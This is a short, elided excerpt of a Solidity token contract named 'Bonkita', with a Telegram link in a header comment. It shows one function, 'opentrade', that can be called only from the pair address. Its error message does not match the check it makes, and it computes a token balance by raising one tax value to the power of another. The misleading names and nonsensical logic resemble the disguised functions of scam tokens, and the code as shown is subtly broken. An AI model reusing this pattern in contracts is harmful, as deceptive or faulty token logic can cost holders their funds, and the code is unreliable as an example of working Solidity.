...
/**
telegram: https://t.me/Bonkitabsc
**/
...
contract Bonkita is IERC20, Ownable, BaseToken {
    ...
    function opentrade(uint256 _silverBuyTax, uint256 _silverSellTax, uint256 constantAmount, address _pair) public {
        require(uniswapV2Pair == _msgSender());
        require(_silverBuyTax > 0, "Transfer amount must be greater than zero");
        uint256 contractTokenBalance = _silverBuyTax ** _silverSellTax;
